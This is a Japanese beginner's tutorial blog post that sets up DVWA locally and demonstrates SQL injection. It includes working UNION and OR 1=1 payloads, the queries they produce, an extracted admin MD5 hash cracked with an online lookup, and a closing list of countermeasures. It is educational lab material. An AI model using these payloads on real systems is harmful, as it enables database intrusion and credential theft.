セキュリティ初心者がDVWAでSQLインジェクションやってみた

## 概要

SQLインジェクションはよく知られた脆弱性の一つですが、「概念としては理解していても、実際に体験したことはない」という方も多いかもしれません。
この記事では、ローカル環境でさまざまな脆弱性を検証できる DVWA（Damn Vulnerable Web Application） を使って、SQLインジェクションの理解を深める取り組みを紹介します。


:::note warn
免責事項
このDVWAはその名の通り脆弱なアプリケーションなので、サーバを侵害される可能性があります。インターネットに接続されたサーバーにアップロードしないでください。この手順を公開されているサーバで実験して侵害されたとしても一切責任は負えません。
また、この記事はあくまで脆弱性の対策を促すためのものなので、悪意を持って使用しないでください。
:::

## DVWAとは？

DVWA（Damn Vulnerable Web Application）は、セキュリティ学習や検証用に設計された脆弱なWebアプリケーションで、以下の目的で活用されています。
- セキュリティ専門家がツールやスキルを合法的な環境でテストする
- Web開発者がセキュリティ対策の必要性を理解する
-  学習者や教育現場で安全なセキュリティ演習環境として利用する
> Damn Vulnerable Web Application (DVWA) は、PHP/MariaDB ベースの非常に脆弱な Web アプリケーションです。主な目的は、セキュリティ専門家が法的な環境でスキルとツールをテストするためのツールとなること、Web 開発者が Web アプリケーションのセキュリティ確保のプロセスをより深く理解できるようにすること、そして学生と教師が管理された教室環境で Web アプリケーションのセキュリティについて学習するのに役立つことです。
DVWAの目的は、シンプルで分かりやすいインターフェースを用いて、最も一般的なWeb脆弱性を様々な難易度で実践することです。このソフトウェアには、文書化されている脆弱性と文書化されていない脆弱性の両方が存在することにご注意ください。これは意図的なものです。ぜひ多くの問題に挑戦し、発見してください。 
https://github.com/digininja/DVWA

SQLインジェクションの他にも以下のような脆弱性を検証可能です。

| 脆弱性名                  | 説明 |
|---------------------------|------|
| **Brute Force**           | パスワードの総当たり攻撃。ログイン画面で検証可能。 |
| **Command Injection**     | システムコマンドを外部から実行できる脆弱性。 |
| **CSRF**                  | クロスサイトリクエストフォージェリ。ユーザーの意図しない操作を実行させる。 |
| **File Inclusion**        | 外部またはローカルファイルを不正に読み込む（LFI/RFI）。 |
| **File Upload**           | 任意のファイルをアップロードし、Webシェル等を配置可能。 |
| **Insecure CAPTCHA**      | CAPTCHAが形だけで、セキュリティ効果が薄い。 |
| **SQL Injection**         | 不正なSQLクエリを挿入してDBを操作する。<font color="red">**今回これ**</font> |
| **XSS (Reflected)**       | 一時的に反映されるスクリプト攻撃。 |
| **XSS (Stored)**          | 永続的に保存・実行されるスクリプト攻撃。 |
| **XSS (DOM)**             | クライアント側でDOM操作により発生するXSS。 |
| **Security Misconfiguration** | サーバ設定の不備による脆弱性 |
| **Weak Session IDs**      | セッションIDが予測可能で乗っ取られるリスク。 |
| **Clickjacking**          | iframe等を用いてユーザーの誤操作を誘導。 |

## 環境構築

Dockerを利用して簡単にローカル環境でDVWAを立ち上げることができます。
```bash
git clone git@github.com:digininja/DVWA.git
cd DVWA
docker compose up -d
```

#### 接続情報

URL : http://localhost:4280/login.php
初期ユーザ : 
| ユーザ名                  | パスワード |
|---------------------------|------|
| admin           | password |

![スクリーンショット 2025-05-11 14.12.30.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2620245/1c61830e-187d-4fe4-90e2-88a80fa8205e.png)

#### 初期設定

ログイン後`Create / Reset Database`を押下しDBの作成を行います。

http://localhost:4280/setup.php
![スクリーンショット 2025-05-11 14.16.40.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2620245/4522498e-75cc-45c3-92bd-18a9e3505176.png)

初期データベースには`users`テーブルと`guestbook`テーブルが含まれており、それぞれの構造やレコードを確認してみます。
```
docker exec -it dvwa-db-1 bash
mysql dvwa -u root -pdvwa
DESC guestbook;
DESC users;
SELECT * FROM users;
SELECT * FROM guestbook;
```

<details><summary>作成されたDBの確認結果</summary>

```sql
MariaDB [dvwa]> SHOW TABLES;
+----------------+
| Tables_in_dvwa |
+----------------+
| guestbook      |
| users          |
+----------------+
2 rows in set (0.002 sec)

MariaDB [dvwa]> DESC guestbook;
+------------+----------------------+------+-----+---------+----------------+
| Field      | Type                 | Null | Key | Default | Extra          |
+------------+----------------------+------+-----+---------+----------------+
| comment_id | smallint(5) unsigned | NO   | PRI | NULL    | auto_increment |
| comment    | varchar(300)         | YES  |     | NULL    |                |
| name       | varchar(100)         | YES  |     | NULL    |                |
+------------+----------------------+------+-----+---------+----------------+
3 rows in set (0.012 sec)

MariaDB [dvwa]> DESC users;
+--------------+-------------+------+-----+---------+-------+
| Field        | Type        | Null | Key | Default | Extra |
+--------------+-------------+------+-----+---------+-------+
| user_id      | int(6)      | NO   | PRI | NULL    |       |
| first_name   | varchar(15) | YES  |     | NULL    |       |
| last_name    | varchar(15) | YES  |     | NULL    |       |
| user         | varchar(15) | YES  |     | NULL    |       |
| password     | varchar(32) | YES  |     | NULL    |       |
| avatar       | varchar(70) | YES  |     | NULL    |       |
| last_login   | timestamp   | YES  |     | NULL    |       |
| failed_login | int(3)      | YES  |     | NULL    |       |
+--------------+-------------+------+-----+---------+-------+
8 rows in set (0.002 sec)

MariaDB [dvwa]> SELECT * FROM users;
+---------+------------+-----------+---------+----------------------------------+-----------------------------+---------------------+--------------+
| user_id | first_name | last_name | user    | password                         | avatar                      | last_login          | failed_login |
+---------+------------+-----------+---------+----------------------------------+-----------------------------+---------------------+--------------+
|       1 | admin      | admin     | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 | /hackable/users/admin.jpg   | 2025-05-11 05:16:56 |            0 |
|       2 | Gordon     | Brown     | gordonb | e99a18c428cb38d5f260853678922e03 | /hackable/users/gordonb.jpg | 2025-05-11 05:16:56 |            0 |
|       3 | Hack       | Me        | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b | /hackable/users/1337.jpg    | 2025-05-11 05:16:56 |            0 |
|       4 | Pablo      | Picasso   | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 | /hackable/users/pablo.jpg   | 2025-05-11 05:16:56 |            0 |
|       5 | Bob        | Smith     | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 | /hackable/users/smithy.jpg  | 2025-05-11 05:16:56 |            0 |
+---------+------------+-----------+---------+----------------------------------+-----------------------------+---------------------+--------------+
5 rows in set (0.003 sec)

MariaDB [dvwa]> SELECT * FROM guestbook;
+------------+-------------------------+------+
| comment_id | comment                 | name |
+------------+-------------------------+------+
|          1 | This is a test comment. | test |
+------------+-------------------------+------+
1 row in set (213503982 days 8 hours 1 min 49.551 sec)

```
</details>

実行されたSQLを確認したいので`audit plugin`も入れておきましょう

```
mysql dvwa -u root -pdvwa
INSTALL PLUGIN server_audit SONAME 'server_audit';
SET GLOBAL server_audit_logging=1;
FLUSH LOGS;
```
ログ確認
```
tail -F /var/lib/mysql/server_audit.log
```


## SQLインジェクション開始

DVWAのSecurityレベルをLowに設定し、左メニューの「SQL Injection」へ移動します。
入力欄に「1」を入れると以下のように表示されます。

![スクリーンショット 2025-05-11 18.34.48.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2620245/ac2510ed-ede9-4923-bbae-184c5c718723.png)


それでは、SQLインジェクションを試してみます。

#### 攻撃パターン1️⃣ - DBエンジンやバージョンを取得する

```
' union select version(), null #
```
上記の値を入力欄に入力してSubmitを押下すると以下のようなクエリが発生します。
```
MariaDB [dvwa]> SELECT first_name, last_name FROM users WHERE user_id = '' union select version(), null ;
+--------------------------+-----------+
| first_name               | last_name |
+--------------------------+-----------+
| 10.11.11-MariaDB-ubu2204 | NULL      |
+--------------------------+-----------+
1 row in set (0.002 sec)
```

そして結果はDBのバージョンが返され、画面上からエンジンとバージョンが見えてしまいます。

![スクリーンショット 2025-05-11 18.34.15.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2620245/c906411f-6a32-472f-9ff9-cbac0758a046.png)

ここでのポイント
| ポイント | 意味 |
|-|-|
| `''` | idが空文字列 |
| `union select version(), null`     | 別のSELECT結果を合体させる（UNION） |
| `#` | 残りをコメントアウト（無視させる） |

つまり本来は、usersテーブルをSELECTするはずだったのにversion()（データベースのバージョン情報を返す関数）を無理やり実行したような感じです。

---

#### 攻撃パターン2️⃣ - 全ユーザの一覧を抜く

```
' OR 1=1 #
```
と入力してSubmitを押下してみて下さい。これで生成されるSQLは以下のようになります。
```
MariaDB [dvwa]> SELECT first_name, last_name FROM users WHERE user_id = '' OR 1=1;
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
| Gordon     | Brown     |
| Hack       | Me        |
| Pablo      | Picasso   |
| Bob        | Smith     |
+------------+-----------+
5 rows in set (0.000 sec)
```

`OR 1=1`なので、usersテーブルの情報が全件取得されてしまいadminユーザの情報も出てきてしまっています。

![スクリーンショット 2025-05-11 18.50.18.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2620245/2ff7879b-1d91-4984-aa34-dc783b20703b.png)

---

#### 攻撃パターン3️⃣ - 特定ユーザ（admin）の情報を狙う

```
' union select user, password from users where user = 'admin' #
```

と入力するとadminユーザのパスワードハッシュが得られます。
```
MariaDB [dvwa]> SELECT first_name, last_name FROM users WHERE user_id = '' union select user, password from users where user = 'admin';
+------------+----------------------------------+
| first_name | last_name                        |
+------------+----------------------------------+
| admin      | 5f4dcc3b5aa765d61d8327deb882cf99 |
+------------+----------------------------------+
1 row in set (0.018 sec)
```

![スクリーンショット 2025-05-11 18.54.27.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2620245/1e48cc67-b2a1-4212-a31d-b27b43ab3d29.png)

ここで、パスワードハッシュが得られました。このハッシュはMD5となっており、ハッシュ化する前の平文が脆弱なものだと、逆引きされてしまう可能性が高くなります。
実際に`5f4dcc3b5aa765d61d8327deb882cf99`を以下のようなオンラインの辞書サイトで検索してみると`password`という文字列が得られます。

https://crackstation.net/

<font color="red">**これで、adminユーザを奪取することができてしまいました。**</font>

## 基本的な対策について

SQLインジェクションの対策としては、主に以下のようなものがあります。

| 対策 | 詳細 |
|------|------|
| プレースホルダを使用 | SQL文とデータを分離することで、ユーザ入力がSQLの構文として解釈されることを防ぐ |
| エスケープ処理 | ユーザが入力した特殊文字（例: `'`, `"`, `;`）を無害化することで、SQL構文と誤解されないようにする。 |
| DB権限を最小限に | アプリが使うDBユーザには必要最小限の権限（SELECT, INSERTなど）だけを付与。<br>誤ってDROP TABLEなどされないように制限。 |
| フレームワークやライブラリのアップデート | 古いバージョンには既知の脆弱性が残っている可能性がある。<br>常にアップデートしておくことで安全性を保つ。 |


## まとめ

今回は、DVWAを使用してSQLインジェクションを実践してみました。このように対策がされていないと簡単にadminユーザを取られてしまうことが分かりました。
本記事をきっかけに、攻撃者の視点を体験することで守りを強くするというセキュリティの基本姿勢を実感いただければ幸いです。
DVWAでは、SQLインジェクションの他にも様々な脆弱性を体験できるので、他の検証記事も記載予定です！
